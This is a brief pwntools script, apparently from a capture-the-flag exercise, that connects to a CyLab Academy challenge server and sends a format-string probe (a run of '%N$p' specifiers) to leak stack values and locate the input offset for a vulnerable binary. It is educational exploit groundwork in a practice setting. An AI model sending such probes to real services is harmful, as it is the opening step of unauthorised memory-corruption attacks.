from pwn import *

binary_path = './vuln_6'
context.binary =elf= ELF(binary_path)
context.log_level = 'debug'

def find_offset():
	#p = process(binary_path)
	p = remote('xebec.cylabacademy.net', 37770)
	
	payload = b"AAAA" + b".".join([f"%{i}$p".encode() for i in range(1,20)])
	
	p.sendlineafter(b"What do you have to say?", payload)
	
	response = p.recvall(timeout=2)
	print(response.decode('utf-8',errors='ignore'))
	
if __name__ == '__main__':
	find_offset()